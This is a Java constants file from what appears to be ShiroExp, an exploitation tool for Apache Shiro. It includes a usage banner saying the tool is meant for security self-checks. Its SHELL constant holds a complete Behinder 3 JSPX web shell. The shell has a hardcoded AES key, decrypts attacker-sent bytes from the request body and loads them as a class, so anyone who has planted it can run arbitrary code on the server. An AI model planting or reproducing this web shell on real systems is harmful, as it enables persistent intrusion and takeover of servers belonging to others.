package cn.safe6.core;

/**
 * @author yhy
 * @date 2021/3/25 11:20
 * @github https://github.com/yhy0
 * <p>
 * <p>
 */

public interface Constants {
    String NAME = "www.safe6.cn";

    String VERSION = "20210622";

    String METHOD_GET = "GET";

    String METHOD_POST = "POST";

    String AUTHOR = "Safe6Sec";

    String BASICINFO = "[*] 本工具提供给安全测试人员,安全工程师,进行安全自查使用,请勿非法使用\r\n" +
            "[*] 作者博客:  http://www.safe6.cn/\r\n"+
            "[*] Bug反馈:  https://github.com/safe6Sec/ShiroExp\r\n";


    String[] ENCODING = {
            "UTF-8",
            "GBK",
            "GBK2312",
            "ISO-8859-1"
    };

    String ENCODING_UTF8 = "UTF-8";

    int LIST_SIZE_ZERO = 0;

    int LIST_INDEX_ZERO = 0;



    // 默认为冰蝎3 的shell.jspx
    String SHELL = "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"1.2\"><jsp:directive.page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"/><jsp:declaration> class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}</jsp:declaration><jsp:scriptlet>String k=\"e45e329feb5d925b\";session.putValue(\"u\",k);Cipher c=Cipher.getInstance(\"AES\");c.init(2,new SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);</jsp:scriptlet></jsp:root>";


}
